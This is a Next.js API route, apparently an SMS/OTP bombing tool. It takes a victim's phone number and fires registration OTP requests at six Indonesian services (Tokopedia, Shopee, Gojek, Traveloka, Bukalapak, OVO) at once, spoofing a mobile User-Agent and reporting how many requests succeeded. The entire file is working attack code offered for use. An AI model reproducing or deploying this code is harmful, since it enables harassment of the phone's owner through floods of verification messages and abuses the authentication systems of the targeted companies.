import { NextRequest, NextResponse } from 'next/server'

export const maxDuration = 10

async function kirim(platform: string, url: string, body: any, headers: any = {}) {
  try {
    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 4000)
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36', ...headers },
      body: JSON.stringify(body),
      signal: controller.signal
    })
    clearTimeout(timeout)
    return { platform, success: res.ok, status: res.status }
  } catch {
    return { platform, success: false, status: 0 }
  }
}

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url)
  const phone = searchParams.get('phone')

  if (!phone) {
    return NextResponse.json({ status: false, message: 'Parameter phone wajib diisi' }, { status: 400 })
  }

  const results = await Promise.all([
    kirim('Tokopedia', 'https://accounts.tokopedia.com/otp/c/page', { phone, type: 'register' }),
    kirim('Shopee', 'https://shopee.co.id/api/v2/authentication/send_otp/', { phone_number: phone, support_whatsapp: false }, { Referer: 'https://shopee.co.id/' }),
    kirim('Gojek', 'https://api.gojek.com/gojek/v1/register/send-otp', { phone_number: phone }),
    kirim('Traveloka', 'https://api.traveloka.com/v1/user/register/send-otp', { phone }),
    kirim('Bukalapak', 'https://api.bukalapak.com/v1/auth/otp-request', { phone }),
    kirim('OVO', 'https://api.ovo.id/v1/otp/send', { mobile_phone: phone }),
  ])

  const berhasil = results.filter(r => r.success).length
  const gagal = results.filter(r => !r.success).length

  return NextResponse.json({
    status: true,
    phone,
    total: results.length,
    berhasil,
    gagal,
    detail: results,
    author: 'Egii Apii'
  })
}
